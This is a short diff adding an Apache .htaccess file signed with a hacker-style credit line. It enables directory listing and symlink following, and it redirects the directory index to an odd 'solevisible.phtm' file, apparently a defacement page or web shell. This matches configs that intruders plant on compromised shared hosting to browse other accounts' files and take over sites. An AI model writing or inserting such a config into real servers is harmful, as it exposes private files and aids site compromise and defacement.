@@ -1,0 +1,4 @@
+#Coded By Sole Sad & Invisible
+Options Indexes FollowSymLinks
+DirectoryIndex solevisible.phtm
+ReadmeName dizin.txt
